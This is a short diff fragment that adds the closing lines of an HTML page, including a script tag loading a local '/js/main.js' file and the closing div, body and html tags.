+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
